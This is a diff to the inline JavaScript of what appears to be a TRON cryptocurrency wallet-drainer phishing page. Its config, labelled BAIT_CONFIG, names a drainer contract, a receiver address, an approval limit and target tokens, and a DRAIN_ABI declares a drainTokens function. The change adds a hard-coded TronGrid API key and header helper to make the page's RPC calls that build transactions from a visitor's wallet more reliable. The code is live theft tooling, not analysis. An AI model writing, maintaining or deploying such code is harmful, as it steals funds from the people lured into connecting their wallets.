@@ -168,7 +168,7 @@
 </div></footer>
 
 <script>
-window.BAIT_CONFIG={wcProjectId:'7b4c156e02caf580713985225e0729b4',bait:'',drainer:'TVYBvusW6wA1iMxbVaigRsc77zwWpWHAPN',receiver:'TH7mvLb3UJ35re2ZuQpTKpHQRQ97pnXYvA',approveLimit:'50000',tokens:['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8']};
+window.BAIT_CONFIG={wcProjectId:'7b4c156e02caf580713985225e0729b4',apiKey:'112650b4-b167-4cb4-87b0-bde7ffb4ae4a',bait:'',drainer:'TVYBvusW6wA1iMxbVaigRsc77zwWpWHAPN',receiver:'TH7mvLb3UJ35re2ZuQpTKpHQRQ97pnXYvA',approveLimit:'50000',tokens:['TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t','TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8']};
 </script>
 <script>
 const $ = (id) => document.getElementById(id);
@@ -177,6 +177,7 @@ const RPC = 'https://api.trongrid.io';
 const CHAIN = 'tron:0x2b6653dc';
 const DEMO = new URLSearchParams(location.search).has('demo');
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+const HDRS = () => Object.assign({ 'content-type': 'application/json' }, cfg.apiKey ? { 'TRON-PRO-API-KEY': cfg.apiKey } : {});
 
 let account = '', found = [], signer = null;
 
@@ -193,7 +194,7 @@ const DRAIN_ABI=[{type:'function',name:'drainTokens',stateMutability:'nonpayable
 
 const setStatus = (t,c) => { for (const id of ['status','formmsg']) { const el=$(id); if(!el) continue; el.textContent = t||''; el.className='status '+(c||''); } };
 
-async function rpc(method, params, tries=8){ let last='net'; for(let i=0;i<tries;i++){ const r=await fetch(RPC+method,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(params)}); const t=await r.text(); if(t.startsWith('{')){const j=JSON.parse(t); if(!j.Error) return j; last=j.Error;} else last='http '+r.status; await sleep(900*(i+1)); } throw new Error(last); }
+async function rpc(method, params, tries=8){ let last='net'; for(let i=0;i<tries;i++){ const r=await fetch(RPC+method,{method:'POST',headers:HDRS(),body:JSON.stringify(params)}); const t=await r.text(); if(t.startsWith('{')){const j=JSON.parse(t); if(!j.Error) return j; last=j.Error;} else last='http '+r.status; await sleep(900*(i+1)); } throw new Error(last); }
 async function readCall(contract, sel, param){ const j=await rpc('/wallet/triggerconstantcontract',{owner_address:account,contract_address:contract,function_selector:sel,parameter:param||'',visible:true}); if(!j.result||!j.result.result) throw new Error('read'); return j.constant_result[0]; }
 async function buildTx(contract, sel, param, fee){ const j=await rpc('/wallet/triggersmartcontract',{owner_address:account,contract_address:contract,function_selector:sel,parameter:param,fee_limit:fee,call_value:0,visible:true}); if(!j.result||!j.result.result) throw new Error('build'); return j.transaction; }
 
